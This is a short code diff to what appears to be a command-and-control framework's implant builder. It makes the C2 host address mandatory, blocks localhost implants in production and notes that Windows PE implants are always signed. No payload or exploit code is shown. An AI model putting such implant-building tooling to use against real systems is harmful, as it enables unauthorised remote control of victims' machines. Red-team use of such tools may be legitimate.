@@ -360,9 +360,14 @@ async function generateBuild(options = {}) {
   }
 
   const arch = String(options.arch || 'amd64').toLowerCase();
-  const host = String(options.host || process.env.BUILD_C2_HOST || '127.0.0.1').trim();
+  const host = String(options.host || process.env.BUILD_C2_HOST || '').trim();
   const port = Number(options.port || process.env.BUILD_C2_PORT || process.env.TCP_PORT || 2026);
-  if (!host) throw new Error('host is required');
+  if (!host) {
+    throw new Error('C2 host is required (set BUILD_C2_HOST on the teamserver or enter host in the builder)');
+  }
+  if (host === '127.0.0.1' && process.env.APP_ENV === 'production') {
+    throw new Error('Refusing to build implant with 127.0.0.1 in production — set BUILD_C2_HOST to your public C2 address');
+  }
   if (!port || port < 1 || port > 65535) throw new Error('invalid port');
 
   // Windows PE: always sign after build (dashboard does not require a toggle)
